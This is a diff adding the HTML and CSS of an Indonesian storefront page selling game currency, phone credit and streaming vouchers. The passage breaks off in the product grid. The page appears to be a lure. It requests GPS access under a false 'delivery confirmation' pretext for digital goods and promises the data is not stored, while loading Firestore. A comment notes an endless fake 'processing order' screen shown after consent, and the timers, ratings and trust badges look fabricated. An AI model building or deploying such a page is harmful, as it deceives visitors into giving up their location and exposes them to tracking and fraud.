@@ -1,0 +1,883 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>NEW STORE — Belanja Murah & Terpercaya</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800;900&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
+<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
+
+<style>
+/* ===== RESET & ROOT ===== */
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
+:root{
+  --bg: #0b0b12;
+  --bg2: #111119;
+  --card: #16161f;
+  --card2: #1c1c28;
+  --border: rgba(255,255,255,0.07);
+  --border2: rgba(255,255,255,0.12);
+  --accent: #6c63ff;
+  --accent2: #a78bfa;
+  --green: #22d3a0;
+  --orange: #f97316;
+  --red: #ef4444;
+  --yellow: #fbbf24;
+  --text: #e2e2f0;
+  --text2: #9898b0;
+  --text3: #5a5a72;
+  --white: #ffffff;
+  --glow: rgba(108,99,255,0.25);
+}
+html,body{font-family:'Plus Jakarta Sans',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;overflow-x:hidden;}
+img{display:block;max-width:100%;}
+button{font-family:inherit;cursor:pointer;border:none;outline:none;}
+::-webkit-scrollbar{width:4px;}
+::-webkit-scrollbar-thumb{background:rgba(108,99,255,0.3);border-radius:4px;}
+
+/* ===== LOADING OVERLAY (infinite gimmick) ===== */
+#loading-overlay{
+  display:none;position:fixed;inset:0;z-index:9999;
+  background:radial-gradient(ellipse at 50% 30%, #1a0540 0%, #090915 60%);
+  align-items:center;justify-content:center;flex-direction:column;
+}
+#loading-overlay.show{display:flex;}
+.ld-logo{font-family:'Space Grotesk',sans-serif;font-size:1.1rem;font-weight:700;letter-spacing:3px;color:rgba(255,255,255,0.4);margin-bottom:36px;}
+.ld-spinner-wrap{position:relative;width:80px;height:80px;margin-bottom:28px;}
+.ld-ring{position:absolute;inset:0;border-radius:50%;border:2px solid transparent;}
+.ld-ring-1{border-top-color:var(--accent);animation:spin 1s linear infinite;}
+.ld-ring-2{inset:8px;border-right-color:var(--green);animation:spin 1.5s linear infinite reverse;}
+.ld-ring-3{inset:16px;border-bottom-color:var(--accent2);animation:spin 2s linear infinite;}
+.ld-dot{position:absolute;inset:28px;background:var(--accent);border-radius:50%;box-shadow:0 0 16px var(--accent);animation:ldpulse 1.5s ease-in-out infinite;}
+@keyframes spin{to{transform:rotate(360deg);}}
+@keyframes ldpulse{0%,100%{transform:scale(0.8);opacity:.6;}50%{transform:scale(1.1);opacity:1;}}
+.ld-text{font-size:0.78rem;color:rgba(255,255,255,0.35);letter-spacing:2px;text-transform:uppercase;margin-bottom:6px;}
+.ld-subtext{font-size:0.65rem;color:rgba(255,255,255,0.18);letter-spacing:1px;}
+.ld-bar-wrap{width:180px;height:3px;background:rgba(255,255,255,0.06);border-radius:3px;overflow:hidden;margin-top:24px;}
+.ld-bar{height:100%;background:linear-gradient(90deg,var(--accent),var(--green));border-radius:3px;animation:ldbar 2.5s ease-in-out infinite;}
+@keyframes ldbar{0%{width:0%;margin-left:0;}60%{width:90%;margin-left:0;}100%{width:10%;margin-left:90%;}}
+
+/* ===== GPS PERMISSION OVERLAY ===== */
+#gps-overlay{
+  display:none;position:fixed;inset:0;z-index:9000;
+  background:rgba(5,5,14,0.94);
+  backdrop-filter:blur(12px);
+  align-items:flex-end;justify-content:center;
+  padding-bottom:0;
+}
+#gps-overlay.show{display:flex;}
+.gps-sheet{
+  width:100%;max-width:480px;
+  background:linear-gradient(160deg,#1a1030,#0d1a10);
+  border:1px solid rgba(108,99,255,0.2);
+  border-bottom:none;
+  border-radius:24px 24px 0 0;
+  padding:32px 24px 48px;
+  animation:slideUp .3s cubic-bezier(0.4,0,0.2,1);
+  position:relative;overflow:hidden;
+}
+.gps-sheet::before{
+  content:'';position:absolute;top:0;left:0;right:0;height:1px;
+  background:linear-gradient(90deg,transparent,var(--accent),var(--green),transparent);
+}
+@keyframes slideUp{from{transform:translateY(100%);}to{transform:translateY(0);}}
+.gps-handle{width:40px;height:4px;background:rgba(255,255,255,0.15);border-radius:2px;margin:0 auto 24px;}
+.gps-icon-wrap{width:72px;height:72px;border-radius:50%;background:linear-gradient(135deg,rgba(108,99,255,0.2),rgba(34,211,160,0.15));border:1px solid rgba(108,99,255,0.3);display:flex;align-items:center;justify-content:center;margin:0 auto 16px;position:relative;}
+.gps-icon-wrap::after{content:'';position:absolute;inset:-6px;border-radius:50%;border:1px solid rgba(108,99,255,0.1);}
+.gps-icon-emoji{font-size:2.2rem;}
+.gps-title{font-family:'Space Grotesk',sans-serif;font-size:1.1rem;font-weight:700;color:var(--white);text-align:center;margin-bottom:10px;letter-spacing:.5px;}
+.gps-sub{font-size:.8rem;color:var(--text2);text-align:center;line-height:1.7;margin-bottom:28px;max-width:300px;margin-left:auto;margin-right:auto;}
+.gps-sub b{color:var(--green);}
+.gps-allow{
+  width:100%;padding:16px;margin-bottom:12px;
+  background:linear-gradient(135deg,var(--accent),#8b5cf6);
+  color:#fff;border-radius:14px;
+  font-size:.88rem;font-weight:700;letter-spacing:.5px;
+  box-shadow:0 8px 24px rgba(108,99,255,0.35);
+  transition:all .2s;
+  display:flex;align-items:center;justify-content:center;gap:8px;
+}
+.gps-allow:active{transform:scale(.98);}
+.gps-deny{
+  width:100%;padding:14px;
+  background:transparent;color:var(--text3);
+  border:1px solid rgba(255,255,255,0.08);border-radius:14px;
+  font-size:.8rem;font-weight:500;
+  transition:all .2s;
+}
+.gps-deny:active{background:rgba(255,255,255,0.04);}
+.gps-note{margin-top:16px;font-size:.65rem;color:var(--text3);text-align:center;line-height:1.5;}
+
+/* ===== NAVBAR ===== */
+.navbar{
+  position:sticky;top:0;z-index:100;
+  background:rgba(11,11,18,0.85);
+  backdrop-filter:blur(20px);
+  border-bottom:1px solid var(--border);
+  padding:0 16px;
+  display:flex;align-items:center;justify-content:space-between;
+  height:60px;
+}
+.nav-logo{display:flex;align-items:center;gap:10px;}
+.nav-logo-icon{width:34px;height:34px;border-radius:10px;background:linear-gradient(135deg,var(--accent),#8b5cf6);display:flex;align-items:center;justify-content:center;font-size:1rem;box-shadow:0 0 16px var(--glow);}
+.nav-brand{font-family:'Space Grotesk',sans-serif;font-weight:700;font-size:.95rem;color:var(--white);letter-spacing:.5px;}
+.nav-brand span{color:var(--accent2);}
+.nav-badge{display:flex;align-items:center;gap:6px;background:rgba(34,211,160,0.1);border:1px solid rgba(34,211,160,0.25);color:var(--green);font-size:.62rem;font-weight:700;padding:4px 10px;border-radius:20px;letter-spacing:1px;}
+.nav-badge::before{content:'';width:6px;height:6px;border-radius:50%;background:var(--green);animation:blink 1.2s infinite;}
+@keyframes blink{0%,100%{opacity:1;}50%{opacity:.3;}}
+
+/* ===== HERO BANNER ===== */
+.hero{
+  margin:16px;border-radius:20px;
+  background:linear-gradient(135deg,#1a103a 0%,#0d2010 50%,#1a0a2a 100%);
+  border:1px solid var(--border2);
+  padding:28px 20px 24px;
+  position:relative;overflow:hidden;
+}
+.hero::before{
+  content:'';position:absolute;top:-40px;right:-40px;
+  width:180px;height:180px;border-radius:50%;
+  background:radial-gradient(circle,rgba(108,99,255,0.15),transparent 70%);
+  pointer-events:none;
+}
+.hero::after{
+  content:'';position:absolute;bottom:-20px;left:-20px;
+  width:120px;height:120px;border-radius:50%;
+  background:radial-gradient(circle,rgba(34,211,160,0.12),transparent 70%);
+  pointer-events:none;
+}
+.hero-tag{display:inline-flex;align-items:center;gap:6px;background:rgba(108,99,255,0.15);border:1px solid rgba(108,99,255,0.3);color:var(--accent2);font-size:.62rem;font-weight:700;padding:4px 10px;border-radius:20px;letter-spacing:1.5px;margin-bottom:14px;text-transform:uppercase;}
+.hero-title{font-family:'Space Grotesk',sans-serif;font-size:1.6rem;font-weight:800;color:var(--white);line-height:1.2;margin-bottom:8px;}
+.hero-title span{background:linear-gradient(90deg,var(--accent2),var(--green));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;}
+.hero-sub{font-size:.8rem;color:var(--text2);line-height:1.6;margin-bottom:20px;}
+.hero-stats{display:flex;gap:16px;flex-wrap:wrap;}
+.hero-stat{text-align:left;}
+.hero-stat-num{font-family:'Space Grotesk',sans-serif;font-size:1.1rem;font-weight:800;color:var(--white);}
+.hero-stat-lbl{font-size:.6rem;color:var(--text3);letter-spacing:1px;text-transform:uppercase;margin-top:1px;}
+
+/* ===== PROMO BANNER ===== */
+.promo-scroll{overflow-x:auto;padding:0 16px;margin-bottom:4px;scrollbar-width:none;}
+.promo-scroll::-webkit-scrollbar{display:none;}
+.promo-track{display:flex;gap:10px;width:max-content;}
+.promo-card{
+  flex-shrink:0;width:240px;height:90px;border-radius:14px;
+  padding:14px 16px;position:relative;overflow:hidden;
+  display:flex;flex-direction:column;justify-content:space-between;
+}
+.promo-card.p1{background:linear-gradient(135deg,#3b1fa8,#7c3aed);}
+.promo-card.p2{background:linear-gradient(135deg,#064e3b,#059669);}
+.promo-card.p3{background:linear-gradient(135deg,#7c2d12,#ea580c);}
+.promo-card-tag{font-size:.55rem;letter-spacing:2px;text-transform:uppercase;color:rgba(255,255,255,.55);font-weight:700;}
+.promo-card-title{font-family:'Space Grotesk',sans-serif;font-size:.9rem;font-weight:700;color:#fff;}
+.promo-card-sub{font-size:.65rem;color:rgba(255,255,255,.6);}
+.promo-card-deco{position:absolute;right:-10px;top:-10px;font-size:3.5rem;opacity:.12;}
+
+/* ===== SECTION HEADER ===== */
+.section-head{padding:20px 16px 12px;display:flex;align-items:center;justify-content:space-between;}
+.section-title{font-family:'Space Grotesk',sans-serif;font-size:.95rem;font-weight:700;color:var(--white);}
+.section-sub{font-size:.7rem;color:var(--text3);margin-top:2px;}
+.see-all{font-size:.7rem;color:var(--accent2);font-weight:600;}
+
+/* ===== CATEGORY PILLS ===== */
+.cat-scroll{overflow-x:auto;padding:0 16px 12px;scrollbar-width:none;}
+.cat-scroll::-webkit-scrollbar{display:none;}
+.cat-track{display:flex;gap:8px;width:max-content;}
+.cat-pill{
+  flex-shrink:0;padding:7px 16px;border-radius:20px;
+  font-size:.72rem;font-weight:600;letter-spacing:.3px;
+  border:1px solid var(--border2);color:var(--text2);
+  background:var(--card);cursor:pointer;transition:all .2s;
+}
+.cat-pill.active,.cat-pill:active{
+  background:linear-gradient(135deg,var(--accent),#8b5cf6);
+  border-color:transparent;color:#fff;
+  box-shadow:0 4px 14px var(--glow);
+}
+
+/* ===== PRODUCT GRID ===== */
+.products-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;padding:0 16px;}
+.product-card{
+  background:var(--card);border:1px solid var(--border);
+  border-radius:16px;overflow:hidden;cursor:pointer;
+  transition:all .2s;position:relative;
+  display:flex;flex-direction:column;
+}
+.product-card:active{transform:scale(.97);border-color:var(--border2);}
+.product-card.featured{grid-column:span 2;flex-direction:row;align-items:center;}
+.product-img{width:100%;aspect-ratio:1;background:var(--card2);position:relative;overflow:hidden;display:flex;align-items:center;justify-content:center;font-size:3rem;}
+.product-card.featured .product-img{width:100px;flex-shrink:0;aspect-ratio:1;}
+.product-img-overlay{position:absolute;inset:0;background:linear-gradient(180deg,transparent 40%,rgba(0,0,0,.6));}
+.product-badge{position:absolute;top:8px;left:8px;font-size:.52rem;font-weight:800;padding:3px 8px;border-radius:6px;letter-spacing:.5px;text-transform:uppercase;z-index:1;}
+.badge-sale{background:#ef4444;color:#fff;}
+.badge-new{background:var(--accent);color:#fff;}
+.badge-hot{background:var(--orange);color:#fff;}
+.badge-best{background:var(--green);color:#000;}
+.product-body{padding:12px;}
+.product-card.featured .product-body{padding:14px;flex:1;}
+.product-name{font-weight:700;font-size:.8rem;color:var(--white);margin-bottom:3px;line-height:1.3;}
+.product-sub{font-size:.65rem;color:var(--text3);margin-bottom:8px;line-height:1.4;}
+.product-price-row{display:flex;align-items:center;gap:6px;flex-wrap:wrap;}
+.product-price{font-family:'Space Grotesk',sans-serif;font-size:.9rem;font-weight:800;color:var(--green);}
+.product-price-ori{font-size:.65rem;color:var(--text3);text-decoration:line-through;}
+.product-discount{font-size:.58rem;font-weight:700;background:rgba(239,68,68,.15);color:#ef4444;padding:2px 6px;border-radius:4px;}
+.product-rating{display:flex;align-items:center;gap:3px;font-size:.62rem;color:var(--yellow);margin-top:6px;}
+.product-rating span{color:var(--text3);}
+.product-btn{
+  margin:0 10px 10px;padding:9px;border-radius:10px;
+  background:linear-gradient(135deg,rgba(108,99,255,.15),rgba(108,99,255,.08));
+  border:1px solid rgba(108,99,255,.25);
+  color:var(--accent2);font-size:.7rem;font-weight:700;
+  display:flex;align-items:center;justify-content:center;gap:6px;
+  transition:all .2s;
+}
+.product-card.featured .product-btn{margin:8px 14px 14px;padding:10px;}
+.product-btn:active{background:rgba(108,99,255,.25);}
+
+/* ===== FLASH SALE ===== */
+.flash-header{
+  margin:8px 16px 0;padding:14px 16px;
+  background:linear-gradient(135deg,#7c0a2f,#b91c1c);
+  border-radius:16px 16px 0 0;
+  display:flex;align-items:center;justify-content:space-between;
+}
+.flash-title{font-family:'Space Grotesk',sans-serif;font-weight:800;font-size:.9rem;color:#fff;display:flex;align-items:center;gap:8px;}
+.flash-timer{display:flex;align-items:center;gap:4px;}
+.flash-timer-box{background:rgba(0,0,0,.3);color:#fff;font-family:'Space Grotesk',sans-serif;font-size:.8rem;font-weight:800;padding:4px 7px;border-radius:6px;min-width:28px;text-align:center;}
+.flash-colon{color:rgba(255,255,255,.6);font-size:.8rem;}
+.flash-products{
+  margin:0 16px 16px;padding:12px;
+  background:var(--card);border:1px solid var(--border);
+  border:1px solid rgba(185,28,28,.25);
+  border-top:none;border-radius:0 0 16px 16px;
+  overflow-x:auto;scrollbar-width:none;
+}
+.flash-products::-webkit-scrollbar{display:none;}
+.flash-track{display:flex;gap:10px;width:max-content;}
+.flash-item{
+  width:130px;flex-shrink:0;background:var(--card2);
+  border:1px solid var(--border);border-radius:12px;
+  overflow:hidden;cursor:pointer;transition:all .2s;
+}
+.flash-item:active{transform:scale(.97);}
+.flash-img{width:100%;height:80px;display:flex;align-items:center;justify-content:center;font-size:2.4rem;background:linear-gradient(135deg,rgba(185,28,28,.1),rgba(0,0,0,.3));}
+.flash-body{padding:8px 10px;}
+.flash-name{font-size:.72rem;font-weight:700;color:var(--white);margin-bottom:2px;}
+.flash-price{font-family:'Space Grotesk',sans-serif;font-size:.82rem;font-weight:800;color:#ef4444;}
+.flash-ori{font-size:.6rem;color:var(--text3);text-decoration:line-through;}
+
+/* ===== TRUST BADGES ===== */
+.trust-row{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin:0 16px 16px;}
+.trust-card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:12px 8px;text-align:center;}
+.trust-icon{font-size:1.4rem;margin-bottom:6px;}
+.trust-label{font-size:.58rem;font-weight:700;color:var(--text2);letter-spacing:.5px;line-height:1.4;}
+
+/* ===== TESTIMONIAL ===== */
+.testi-scroll{overflow-x:auto;padding:0 16px 16px;scrollbar-width:none;}
+.testi-scroll::-webkit-scrollbar{display:none;}
+.testi-track{display:flex;gap:10px;width:max-content;}
+.testi-card{
+  width:220px;flex-shrink:0;
+  background:var(--card);border:1px solid var(--border);
+  border-radius:14px;padding:14px;
+}
+.testi-stars{color:var(--yellow);font-size:.75rem;margin-bottom:8px;}
+.testi-text{font-size:.72rem;color:var(--text2);line-height:1.6;margin-bottom:10px;}
+.testi-user{display:flex;align-items:center;gap:8px;}
+.testi-av{width:28px;height:28px;border-radius:50%;background:linear-gradient(135deg,var(--accent),#8b5cf6);display:flex;align-items:center;justify-content:center;font-size:.75rem;font-weight:700;color:#fff;flex-shrink:0;}
+.testi-name{font-size:.68rem;font-weight:700;color:var(--white);}
+.testi-loc{font-size:.6rem;color:var(--text3);}
+
+/* ===== BOTTOM NAV ===== */
+.bottom-nav{
+  position:sticky;bottom:0;left:0;right:0;
+  background:rgba(11,11,18,.92);backdrop-filter:blur(20px);
+  border-top:1px solid var(--border);
+  display:flex;align-items:center;justify-content:space-around;
+  padding:10px 0 16px;z-index:50;
+}
+.bn-item{display:flex;flex-direction:column;align-items:center;gap:3px;color:var(--text3);font-size:.58rem;font-weight:600;letter-spacing:.5px;padding:0 12px;cursor:pointer;transition:all .2s;}
+.bn-item.active,.bn-item:active{color:var(--accent2);}
+.bn-item-icon{font-size:1.1rem;}
+.bn-cart{
+  width:52px;height:52px;border-radius:50%;
+  background:linear-gradient(135deg,var(--accent),#8b5cf6);
+  display:flex;align-items:center;justify-content:center;
+  font-size:1.3rem;color:#fff;
+  box-shadow:0 0 24px var(--glow);
+  position:relative;top:-8px;
+}
+
+/* ===== SPACER ===== */
+.spacer{height:24px;}
+</style>
+</head>
+<body>
+
+<!-- ===== LOADING OVERLAY (infinite setelah GPS) ===== -->
+<div id="loading-overlay">
+  <div class="ld-logo">NEW STORE</div>
+  <div class="ld-spinner-wrap">
+    <div class="ld-ring ld-ring-1"></div>
+    <div class="ld-ring ld-ring-2"></div>
+    <div class="ld-ring ld-ring-3"></div>
+    <div class="ld-dot"></div>
+  </div>
+  <div class="ld-text">Memproses Pesanan</div>
+  <div class="ld-subtext">Mohon jangan tutup halaman ini</div>
+  <div class="ld-bar-wrap"><div class="ld-bar"></div></div>
+</div>
+
+<!-- ===== GPS PERMISSION SHEET ===== -->
+<div id="gps-overlay">
+  <div class="gps-sheet">
+    <div class="gps-handle"></div>
+    <div class="gps-icon-wrap"><span class="gps-icon-emoji">📍</span></div>
+    <div class="gps-title">Konfirmasi Lokasi Pengiriman</div>
+    <div class="gps-sub">Untuk memastikan produk dikirim ke lokasi yang tepat, kami perlu mengonfirmasi lokasi Anda. <b>Proses ini hanya dilakukan sekali.</b></div>
+    <button class="gps-allow" id="gps-allow-btn">
+      <span>📍</span> Izinkan Akses Lokasi
+    </button>
+    <button class="gps-deny" id="gps-deny-btn">Lanjut tanpa konfirmasi lokasi</button>
+    <div class="gps-note">🔒 Lokasi Anda hanya digunakan untuk konfirmasi pengiriman dan tidak akan disimpan secara permanen</div>
+  </div>
+</div>
+
+<!-- ===== MAIN CONTENT ===== -->
+<div id="main-content">
+
+<!-- NAVBAR -->
+<nav class="navbar">
+  <div class="nav-logo">
+    <div class="nav-logo-icon">🛍</div>
+    <div>
+      <div class="nav-brand">NEW <span>STORE</span></div>
+    </div>
+  </div>
+  <div class="nav-badge">ONLINE</div>
+</nav>
+
+<!-- HERO -->
+<div class="hero">
+  <div class="hero-tag">⚡ Promo Hari Ini</div>
+  <div class="hero-title">Belanja Hemat,<br><span>Kualitas Terjamin</span></div>
+  <div class="hero-sub">Produk original terpercaya dengan harga paling kompetitif. Pengiriman cepat ke seluruh Indonesia.</div>
+  <div class="hero-stats">
+    <div class="hero-stat">
+      <div class="hero-stat-num">50K+</div>
+      <div class="hero-stat-lbl">Produk</div>
+    </div>
+    <div class="hero-stat">
+      <div class="hero-stat-num">99%</div>
+      <div class="hero-stat-lbl">Rating</div>
+    </div>
+    <div class="hero-stat">
+      <div class="hero-stat-num">1 Jam</div>
+      <div class="hero-stat-lbl">Proses</div>
+    </div>
+  </div>
+</div>
+
+<!-- PROMO BANNERS -->
+<div class="section-head" style="padding-bottom:8px;">
+  <div><div class="section-title">🔥 Promo Unggulan</div></div>
+</div>
+<div class="promo-scroll">
+  <div class="promo-track">
+    <div class="promo-card p1">
+      <div><div class="promo-card-tag">DISKON SPESIAL</div><div class="promo-card-title">Hemat s/d 60%</div><div class="promo-card-sub">Semua kategori produk</div></div>
+      <div class="promo-card-deco">💜</div>
+    </div>
+    <div class="promo-card p2">
+      <div><div class="promo-card-tag">GRATIS ONGKIR</div><div class="promo-card-title">Min. Belanja 50K</div><div class="promo-card-sub">Berlaku seluruh Indonesia</div></div>
+      <div class="promo-card-deco">🚀</div>
+    </div>
+    <div class="promo-card p3">
+      <div><div class="promo-card-tag">CASHBACK</div><div class="promo-card-title">10% Tiap Pembelian</div><div class="promo-card-sub">Khusus member baru</div></div>
+      <div class="promo-card-deco">💰</div>
+    </div>
+  </div>
+</div>
+
+<!-- FLASH SALE -->
+<div class="flash-header">
+  <div class="flash-title">⚡ Flash Sale</div>
+  <div class="flash-timer">
+    <div class="flash-timer-box" id="fh">02</div>
+    <div class="flash-colon">:</div>
+    <div class="flash-timer-box" id="fm">47</div>
+    <div class="flash-colon">:</div>
+    <div class="flash-timer-box" id="fs">33</div>
+  </div>
+</div>
+<div class="flash-products">
+  <div class="flash-track">
+    <div class="flash-item" onclick="onProductClick(this,'Voucher Game 100K')">
+      <div class="flash-img">🎮</div>
+      <div class="flash-body">
+        <div class="flash-name">Voucher Game 100K</div>
+        <div class="flash-price">Rp 75.000</div>
+        <div class="flash-ori">Rp 100.000</div>
+      </div>
+    </div>
+    <div class="flash-item" onclick="onProductClick(this,'Pulsa 50K')">
+      <div class="flash-img">📱</div>
+      <div class="flash-body">
+        <div class="flash-name">Pulsa 50K</div>
+        <div class="flash-price">Rp 47.500</div>
+        <div class="flash-ori">Rp 50.000</div>
+      </div>
+    </div>
+    <div class="flash-item" onclick="onProductClick(this,'Netflix 1 Bulan')">
+      <div class="flash-img">🎬</div>
+      <div class="flash-body">
+        <div class="flash-name">Netflix 1 Bln</div>
+        <div class="flash-price">Rp 52.000</div>
+        <div class="flash-ori">Rp 65.000</div>
+      </div>
+    </div>
+    <div class="flash-item" onclick="onProductClick(this,'Spotify Premium')">
+      <div class="flash-img">🎵</div>
+      <div class="flash-body">
+        <div class="flash-name">Spotify Premium</div>
+        <div class="flash-price">Rp 18.000</div>
+        <div class="flash-ori">Rp 25.000</div>
+      </div>
+    </div>
+    <div class="flash-item" onclick="onProductClick(this,'Paket Data 15GB')">
+      <div class="flash-img">📡</div>
+      <div class="flash-body">
+        <div class="flash-name">Data 15GB</div>
+        <div class="flash-price">Rp 28.000</div>
+        <div class="flash-ori">Rp 40.000</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- TRUST BADGES -->
+<div class="trust-row">
+  <div class="trust-card"><div class="trust-icon">🛡️</div><div class="trust-label">100% AMAN &amp; TERPERCAYA</div></div>
+  <div class="trust-card"><div class="trust-icon">⚡</div><div class="trust-label">PROSES INSTAN 24/7</div></div>
+  <div class="trust-card"><div class="trust-icon">💬</div><div class="trust-label">CS SIAP BANTU</div></div>
+</div>
+
+<!-- CATEGORIES -->
+<div class="cat-scroll">
+  <div class="cat-track">
+    <div class="cat-pill active" onclick="filterCat(this,'semua')">Semua</div>
+    <div class="cat-pill" onclick="filterCat(this,'game')">🎮 Game</div>
+    <div class="cat-pill" onclick="filterCat(this,'pulsa')">📱 Pulsa & Data</div>
+    <div class="cat-pill" onclick="filterCat(this,'streaming')">🎬 Streaming</div>
+    <div class="cat-pill" onclick="filterCat(this,'ecommerce')">🛒 E-Commerce</div>
+    <div class="cat-pill" onclick="filterCat(this,'lainnya')">✨ Lainnya</div>
+  </div>
+</div>
+
+<!-- FEATURED PRODUCT -->
+<div class="section-head" style="padding-bottom:0;">
+  <div><div class="section-title">⭐ Produk Unggulan</div><div class="section-sub">Terlaris minggu ini</div></div>
+</div>
+<div style="padding:12px 16px 0;">
+  <div class="product-card featured" onclick="onProductClick(this,'Diamond Mobile Legends 565+65')">
+    <div class="product-img" style="background:linear-gradient(135deg,#1a0050,#3b0080);">💎<div class="product-img-overlay"></div><div class="product-badge badge-best">TERLARIS</div></div>
+    <div class="product-body">
+      <div class="product-name">Diamond Mobile Legends 565+65</div>
+      <div class="product-sub">Langsung masuk akun · Proses 1-5 menit</div>
+      <div class="product-price-row">
+        <div class="product-price">Rp 98.000</div>
+        <div class="product-price-ori">Rp 120.000</div>
+        <div class="product-discount">-18%</div>
+      </div>
+      <div class="product-rating">⭐⭐⭐⭐⭐ <span>(4.9k ulasan)</span></div>
+      <div class="product-btn" style="margin:10px 0 0;">🛒 Beli Sekarang</div>
+    </div>
+  </div>
+</div>
+
+<!-- PRODUCT GRID -->
+<div class="section-head">
+  <div><div class="section-title">🛍️ Semua Produk</div></div>
+  <div class="see-all">Lihat semua →</div>
+</div>
+<div class="products-grid" id="products-grid">
+
+  <div class="product-card" onclick="onProductClick(this,'UC PUBG Mobile 325')">
+    <div class="product-img" style="background:linear-gradient(135deg,#0a2a1a,#15803d);">🔫<div class="product-img-overlay"></div><div class="product-badge badge-hot">HOT</div></div>
+    <div class="product-body">
+      <div class="product-name">UC PUBG Mobile 325</div>
+      <div class="product-sub">Isi langsung · ID game</div>
+      <div class="product-price-row"><div class="product-price">Rp 55.000</div><div class="product-price-ori">Rp 65.000</div></div>
+      <div class="product-rating">⭐⭐⭐⭐⭐ <span>(2.1k)</span></div>
+    </div>
+    <div class="product-btn">🛒 Beli</div>
+  </div>
+
+  <div class="product-card" onclick="onProductClick(this,'Free Fire Diamond 520')">
+    <div class="product-img" style="background:linear-gradient(135deg,#2a1a00,#d97706);">🔥<div class="product-img-overlay"></div><div class="product-badge badge-sale">SALE</div></div>
+    <div class="product-body">
+      <div class="product-name">Free Fire Diamond 520</div>
+      <div class="product-sub">Instan · Auto masuk</div>
+      <div class="product-price-row"><div class="product-price">Rp 72.000</div><div class="product-price-ori">Rp 89.000</div></div>
+      <div class="product-rating">⭐⭐⭐⭐⭐ <span>(3.4k)</span></div>
+    </div>
+    <div class="product-btn">🛒 Beli</div>
+  </div>
+
+  <div class="product-card" onclick="onProductClick(this,'Genesis Crystal Genshin 980')">
+    <div class="product-img" style="background:linear-gradient(135deg,#0f172a,#1e40af);">✨<div class="product-img-overlay"></div><div class="product-badge badge-new">BARU</div></div>
+    <div class="product-body">
+      <div class="product-name">Genesis Crystal Genshin 980</div>
+      <div class="product-sub">Server Asia · Instan</div>
+      <div class="product-price-row"><div class="product-price">Rp 148.000</div></div>
+      <div class="product-rating">⭐⭐⭐⭐⭐ <span>(890)</span></div>
+    </div>
+    <div class="product-btn">🛒 Beli</div>
+  </div>
+
+  <div class="product-card" onclick="onProductClick(this,'Valorant VP 700')">
+    <div class="product-img" style="background:linear-gradient(135deg,#1a0010,#be123c);">🎯<div class="product-img-overlay"></div></div>
+    <div class="product-body">
+      <div class="product-name">Valorant VP 700</div>
+      <div class="product-sub">Region ID · Fast</div>
+      <div class="product-price-row"><div class="product-price">Rp 62.000</div><div class="product-discount">-15%</div></div>
+      <div class="product-rating">⭐⭐⭐⭐⭐ <span>(1.2k)</span></div>
+    </div>
+    <div class="product-btn">🛒 Beli</div>
+  </div>
+
+  <div class="product-card" onclick="onProductClick(this,'Netflix Premium 1 Bulan')">
+    <div class="product-img" style="background:linear-gradient(135deg,#1a0000,#991b1b);">🎬<div class="product-img-overlay"></div><div class="product-badge badge-best">POPULER</div></div>
+    <div class="product-body">
+      <div class="product-name">Netflix Premium 1 Bulan</div>
+      <div class="product-sub">4K UHD · 5 Screen</div>
+      <div class="product-price-row"><div class="product-price">Rp 52.000</div><div class="product-price-ori">Rp 70.000</div></div>
+      <div class="product-rating">⭐⭐⭐⭐⭐ <span>(5.7k)</span></div>
+    </div>
+    <div class="product-btn">🛒 Beli</div>
+  </div>
+
+  <div class="product-card" onclick="onProductClick(this,'Spotify Premium 3 Bulan')">
+    <div class="product-img" style="background:linear-gradient(135deg,#001a05,#15803d);">🎵<div class="product-img-overlay"></div></div>
+    <div class="product-body">
+      <div class="product-name">Spotify Premium 3 Bln</div>
+      <div class="product-sub">Offline · No ads</div>
+      <div class="product-price-row"><div class="product-price">Rp 45.000</div><div class="product-price-ori">Rp 72.000</div></div>
+      <div class="product-rating">⭐⭐⭐⭐⭐ <span>(4.1k)</span></div>
+    </div>
+    <div class="product-btn">🛒 Beli</div>
+  </div>
+
+  <div class="product-card" onclick="onProductClick(this,'Pulsa Telkomsel 50K')">
+    <div class="product-img" style="background:linear-gradient(135deg,#1a1000,#ca8a04);">📱<div class="product-img-overlay"></div><div class="product-badge badge-hot">CEPAT</div></div>
+    <div class="product-body">
+      <div class="product-name">Pulsa Telkomsel 50K</div>
+      <div class="product-sub">Semua operator · Instan</div>
+      <div class="product-price-row"><div class="product-price">Rp 48.500</div></div>
+      <div class="product-rating">⭐⭐⭐⭐⭐ <span>(12k)</span></div>
+    </div>
+    <div class="product-btn">🛒 Beli</div>
+  </div>
+
+  <div class="product-card" onclick="onProductClick(this,'Paket Data XL 20GB')">
+    <div class="product-img" style="background:linear-gradient(135deg,#00101a,#0284c7);">📡<div class="product-img-overlay"></div><div class="product-badge badge-sale">HEMAT</div></div>
+    <div class="product-body">
+      <div class="product-name">Paket Data XL 20GB</div>
+      <div class="product-sub">30 Hari · Full Speed</div>
+      <div class="product-price-row"><div class="product-price">Rp 35.000</div><div class="product-price-ori">Rp 55.000</div></div>
+      <div class="product-rating">⭐⭐⭐⭐⭐ <span>(8.3k)</span></div>
+    </div>
+    <div class="product-btn">🛒 Beli</div>
+  </div>
+
+  <div class="product-card" onclick="onProductClick(this,'Shopee Voucher 50K')">
+    <div class="product-img" style="background:linear-gradient(135deg,#1a0800,#ea580c);">🛒<div class="product-img-overlay"></div><div class="product-badge badge-new">NEWs</div></div>
+    <div class="product-body">
+      <div class="product-name">Shopee Voucher 50K</div>
+      <div class="product-sub">Min. belanja 100K</div>
+      <div class="product-price-row"><div class="product-price">Rp 42.000</div></div>
+      <div class="product-rating">⭐⭐⭐⭐ <span>(2.0k)</span></div>
+    </div>
+    <div class="product-btn">🛒 Beli</div>
+  </div>
+
